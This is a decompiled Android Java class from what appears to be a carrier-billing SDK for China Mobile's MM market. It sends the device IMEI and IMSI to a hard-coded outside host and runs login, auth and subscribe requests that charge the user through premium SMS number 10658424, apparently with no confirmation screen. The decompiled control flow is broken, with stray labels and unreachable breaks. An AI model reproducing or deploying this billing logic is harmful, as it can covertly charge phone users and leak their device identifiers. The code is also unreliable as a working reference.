package com.upay.billing.engine.cmcc_mm_dj;

import android.annotation.SuppressLint;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class Main
  extends CommonEngine
{
  private static final int Pay_Fail = 161;
  private static final int Ready_Pay_Fial = 160;
  private static final String TAG = "cmcc_mm_dj_test";
  private static final String Url1 = "http://$ip/cmcc/mm/online/s2sLoginX";
  private static final String Url2 = "http://$ip/cmcc/mm/online/s2sAuthX";
  private static final String Url3 = "http://$ip/cmcc/mm/online/s2sSubscribeX";
  private static final String Url_ip = "http://pr.sppro.info:8887/sp?a=1";
  private static final String Url_params1 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><pid>$pid</pid><imei>$imei</imei><imsi>$imsi</imsi><version>$version</version></root>";
  private static final String Url_params2 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><imei>$imei</imei><imsi>$imsi</imsi><version>$version</version><channelId>$channelId</channelId><chargeId>$chargeId</chargeId><payId>$payId</payId><randNum>$randNum</randNum><sid>$sid</sid><key>$key</key><pid>$pid</pid><loginResponse>$loginResponse</loginResponse></root>";
  private static final String Url_params3 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><imei>$imei</imei><imsi>$imsi</imsi><version>$version</version><channelId>$channelId</channelId><chargeId>$chargeId</chargeId><payId>$payId</payId><randNum>$randNum</randNum><sid>$sid</sid><key>$key</key><pid>$pid</pid><pKey>$pKey</pKey><authResponse>$authResponse</authResponse></root>";
  private static final String feeUrl = "http://$ip/cmcc/mm/single/chargeSMS?pid=$pid&imei=$imei&imsi=$imsi&chargeId=$chargeId&payId=$payId&version=$version&channelId=$channelId";
  private static final String num = "10658424";
  private static final String num_weak = "1065842410";
  private static final String reqUrl1 = "http://ospd.mmarket.com/mmwlan/applySecCertForAPPThird";
  private static final String reqUrl2 = "http://ospd.mmarket.com/trusted4";
  private static final String reqUrl3 = "http://ospd.mmarket.com/trusted4";
  private static final String url_req1 = "$req";
  private static final String url_req2 = "$req";
  private static final String url_req3 = "$req";
  private String authResponse;
  private List<String> confirmFail;
  private int count = 0;
  private String loginResponse;
  private List<String> regFail;
  private List<String> regSmsFail;
  private List<String> reqFail;
  private List<String> sendFail;
  private List<String> sendSucc;
  private int tag = 0;
  
  public Main() {}
  
  @SuppressLint({"SimpleDateFormat"})
  private long get_time()
  {
    try
    {
      SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
      long l = localSimpleDateFormat.parse(localSimpleDateFormat.format(new Date())).getTime();
      return l;
    }
    catch (ParseException localParseException)
    {
      localParseException.printStackTrace();
    }
    return 0L;
  }
  
  private void mm_weak_pay(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6, String paramString7, String paramString8, Trade paramTrade, String paramString9, Json paramJson1, Json paramJson2, Cmd paramCmd, int paramInt)
  {
    Util.addTask(new Main.3(this, "http://$ip/cmcc/mm/single/chargeSMS?pid=$pid&imei=$imei&imsi=$imsi&chargeId=$chargeId&payId=$payId&version=$version&channelId=$channelId".replace("$ip", paramString1).replace("$pid", paramString2).replace("$imei", paramString3).replace("$imsi", paramString4).replace("$chargeId", paramString5).replace("$payId", paramString6).replace("$version", paramString7).replace("$channelId", paramString8), paramTrade, paramString9, paramJson1, paramCmd, paramJson2, paramString5, paramInt));
  }
  
  private void mm_xhz(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6, String paramString7, String paramString8, String paramString9, int paramInt, Trade paramTrade, Json paramJson1, Json paramJson2, String paramString10, Cmd paramCmd)
  {
    byte[] arrayOfByte = Util.stringToBytes("<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><pid>$pid</pid><imei>$imei</imei><imsi>$imsi</imsi><version>$version</version></root>".replace("$pid", paramString4).replace("$imei", paramString2).replace("$imsi", paramString3).replace("$version", paramString7));
    Util.addTask(new Main.4(this, "http://$ip/cmcc/mm/online/s2sLoginX".replace("$ip", paramString1), paramString1, paramString2, paramString3, paramString4, paramString5, paramString9, paramString6, paramString7, paramTrade, paramInt, paramJson1, paramJson2, paramString10, paramString8, paramCmd).setPostData(arrayOfByte));
  }
  
  private void pay_quest(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6, String paramString7, String paramString8, int paramInt, Trade paramTrade, Json paramJson1, Json paramJson2, String paramString9, String paramString10, Cmd paramCmd, String paramString11, String paramString12)
  {
    paramString2 = Util.stringToBytes("<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><imei>$imei</imei><imsi>$imsi</imsi><version>$version</version><channelId>$channelId</channelId><chargeId>$chargeId</chargeId><payId>$payId</payId><randNum>$randNum</randNum><sid>$sid</sid><key>$key</key><pid>$pid</pid><pKey>$pKey</pKey><authResponse>$authResponse</authResponse></root>".replace("$imei", paramString2).replace("$imsi", paramString3).replace("$version", paramString8).replace("$channelId", paramString5).replace("$chargeId", paramString7).replace("$payId", paramString11).replace("$randNum", Util.getString(this.core.getContext(), "randNum2")).replace("$sid", paramString6).replace("$key", Util.getString(this.core.getContext(), "key")).replace("$pid", paramString4).replace("$pKey", paramString12).replace("$authResponse", this.authResponse));
    Util.addTask(new Main.8(this, "http://$ip/cmcc/mm/online/s2sSubscribeX".replace("$ip", paramString1), paramString7, paramInt, paramTrade, paramJson1, paramJson2, paramString9, paramString10, paramCmd).setPostData(paramString2));
  }
  
  private void ready_pay(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6, String paramString7, String paramString8, Trade paramTrade, int paramInt, Json paramJson1, Json paramJson2, String paramString9, String paramString10, Cmd paramCmd)
  {
    byte[] arrayOfByte = Util.stringToBytes("<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><imei>$imei</imei><imsi>$imsi</imsi><version>$version</version><channelId>$channelId</channelId><chargeId>$chargeId</chargeId><payId>$payId</payId><randNum>$randNum</randNum><sid>$sid</sid><key>$key</key><pid>$pid</pid><loginResponse>$loginResponse</loginResponse></root>".replace("$imei", paramString2).replace("$imsi", paramString3).replace("$version", paramString8).replace("$channelId", paramString5).replace("$chargeId", paramString6).replace("$payId", paramString7).replace("$randNum", Util.getString(this.core.getContext(), "randNum1")).replace("$sid", Util.getString(this.core.getContext(), "sid1")).replace("$key", Util.getString(this.core.getContext(), "key")).replace("$pid", paramString4).replace("$loginResponse", this.loginResponse));
    Util.addTask(new Main.6(this, "http://$ip/cmcc/mm/online/s2sAuthX".replace("$ip", paramString1), paramString1, paramString2, paramString3, paramString4, paramString5, paramString6, paramString8, paramInt, paramTrade, paramJson1, paramJson2, paramString9, paramString10, paramCmd, paramString7).setPostData(arrayOfByte));
  }
  
  private void req1_quest(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6, String paramString7, String paramString8, String paramString9, Trade paramTrade, int paramInt, Json paramJson1, Json paramJson2, String paramString10, String paramString11, Cmd paramCmd)
  {
    byte[] arrayOfByte = Util.stringToBytes("$req".replace("$req", paramString1));
    Util.addTask(new Main.5(this, "http://ospd.mmarket.com/mmwlan/applySecCertForAPPThird", paramString3, paramString4, paramString2, paramString5, paramString6, paramString7, paramString8, paramString9, paramTrade, paramInt, paramJson1, paramJson2, paramString10, paramString11, paramCmd, paramString1).setPostData(arrayOfByte).addHeader("Accept", "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2").addHeader("Content-Type", "text/plain; charset=ISO-8859-1"));
  }
  
  private void req2_quest(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6, String paramString7, String paramString8, int paramInt, Trade paramTrade, Json paramJson1, String paramString9, Json paramJson2, String paramString10, String paramString11, Cmd paramCmd, String paramString12, String paramString13)
  {
    paramString9 = Util.stringToBytes("$req".replace("$req", paramString9));
    Util.addTask(new Main.7(this, "http://ospd.mmarket.com/trusted4", paramString1, paramString2, paramString3, paramString4, paramString5, paramString6, paramString7, paramString8, paramInt, paramTrade, paramJson1, paramJson2, paramString10, paramString11, paramCmd, paramString12, paramString13).setPostData(paramString9).addHeader("Accept", "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2").addHeader("Content-Type", "text/plain; charset=ISO-8859-1"));
  }
  
  private void req3_request(String paramString1, String paramString2, int paramInt, Trade paramTrade, Json paramJson1, Json paramJson2, String paramString3, String paramString4, Cmd paramCmd)
  {
    paramString1 = Util.stringToBytes("$req".replace("$req", paramString1));
    Util.addTask(new Main.9(this, "http://ospd.mmarket.com/trusted4", paramString2, paramTrade, paramString3, paramCmd, paramJson1, paramJson2, paramInt).setPostData(paramString1).addHeader("Accept", "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2").addHeader("Content-Type", "text/plain; charset=ISO-8859-1"));
  }
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return (paramOp == Op.CMCC) && (paramBoolean1) && (paramBoolean2);
  }
  
  public boolean isComposable()
  {
    return true;
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("cmcc_mm_dj_test", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    switch (Main.10.$SwitchMap$com$upay$billing$engine$cmcc_mm_dj$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      return 524288;
    case 2: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    Log.i("cmcc_mm_dj_test", "pay");
    this.regFail = new ArrayList();
    this.sendSucc = new ArrayList();
    this.sendFail = new ArrayList();
    this.confirmFail = new ArrayList();
    this.reqFail = new ArrayList();
    this.regSmsFail = new ArrayList();
    this.count = 0;
    Iterator localIterator = Util.safeIter(paramTrade.subTrades).iterator();
    if (localIterator.hasNext())
    {
      Object localObject1 = (Json)localIterator.next();
      this.count += 1;
      int i = this.count;
      int j = paramTrade.subTrades.length();
      String str1 = ((Json)localObject1).getStr("sn");
      Object localObject2 = paramList.iterator();
      Cmd localCmd;
      do
      {
        boolean bool = ((Iterator)localObject2).hasNext();
        localCmd = null;
        if (!bool) {
          break;
        }
        localCmd = (Cmd)((Iterator)localObject2).next();
      } while (!localCmd.key.equals(((Json)localObject1).getStr("cmd_key")));
      Json localJson1 = Json.parse(localCmd.msg);
      localObject1 = localJson1.getStr("type");
      localObject2 = localJson1.getStr("version");
      String str2 = localJson1.getStr("ip");
      String str3 = localJson1.getStr("mode");
      localJson1 = localJson1.getArray("params");
      Json localJson2 = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "cmd_key", localCmd.key, "bt_key", this.key, "target", "", "sn", str1, "request", "", "response", "" });
      Json localJson3 = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "cmd_key", localCmd.key, "bt_key", this.key, "description", "zyd_mm", "mt_msg", "", "mt_num", "", "sn", str1 });
      int k = localJson1.length();
      i = 0;
      label515:
      Object localObject4;
      Object localObject3;
      String str4;
      String str5;
      String str6;
      String str7;
      if (i < k)
      {
        localObject4 = localJson1.getObjectAt(i);
        localObject3 = this.core.getUpayContext();
        str4 = Util.ifEmpty(((UpayContext)localObject3).imsi, "");
        localObject3 = Util.ifEmpty(((UpayContext)localObject3).imei, "");
        str5 = ((Json)localObject4).getStr("chargeId");
        str6 = ((Json)localObject4).getStr("pid");
        localObject4 = ((Json)localObject4).getStr("channelId");
        str7 = "00" + Util.shortenSn(str1, true);
        if ((Util.empty((String)localObject1)) || (!"get-weak".equals(((String)localObject1).trim()))) {
          break label855;
        }
        if ((Util.getLong(this.core.getContext(), "time") == 0L) || (Util.getString(this.core.getContext(), "ip_url") == null) || (Util.getString(this.core.getContext(), "ip_url").equals(""))) {
          break label814;
        }
        if (get_time() - Util.getLong(this.core.getContext(), "time") > 86400000L) {
          break label773;
        }
        mm_weak_pay(Util.getString(this.core.getContext(), "ip_url"), str6, (String)localObject3, str4, str5, str7, (String)localObject2, (String)localObject4, paramTrade, str1, localJson2, localJson3, localCmd, j);
      }
      for (;;)
      {
        i += 1;
        break label515;
        break;
        label773:
        Util.addTask(new Main.1(this, "http://pr.sppro.info:8887/sp?a=1", str6, (String)localObject3, str4, str5, str7, (String)localObject2, (String)localObject4, paramTrade, str1, localJson2, localJson3, localCmd, j));
        continue;
        label814:
        Util.addTask(new Main.2(this, "http://pr.sppro.info:8887/sp?a=1", str6, (String)localObject3, str4, str5, str7, (String)localObject2, (String)localObject4, paramTrade, str1, localJson2, localJson3, localCmd, j));
        continue;
        label855:
        if ((Util.getString(this.core.getContext(), "imeis") != null) && (!Util.getString(this.core.getContext(), "imeis").equals("")) && (((String)localObject3).equals(Util.getString(this.core.getContext(), "imeis"))) && (Util.getString(this.core.getContext(), "imsis") != null) && (!Util.getString(this.core.getContext(), "imsis").equals("")) && (str4.equals(Util.getString(this.core.getContext(), "imsis"))) && (Util.getString(this.core.getContext(), "sid1") != null) && (!Util.getString(this.core.getContext(), "sid1").equals("")) && (Util.getString(this.core.getContext(), "key") != null) && (!Util.getString(this.core.getContext(), "key").equals("")) && (Util.getString(this.core.getContext(), "randNum1") != null) && (!Util.getString(this.core.getContext(), "randNum1").equals("")))
        {
          ready_pay(str2, (String)localObject3, str4, str6, (String)localObject4, str5, str7, (String)localObject2, paramTrade, j, localJson2, localJson3, str1, str3, localCmd);
        }
        else
        {
          this.tag = 0;
          mm_xhz(str2, (String)localObject3, str4, str6, (String)localObject4, str7, (String)localObject2, str3, str5, j, paramTrade, localJson2, localJson3, str1, localCmd);
        }
      }
    }
  }
}
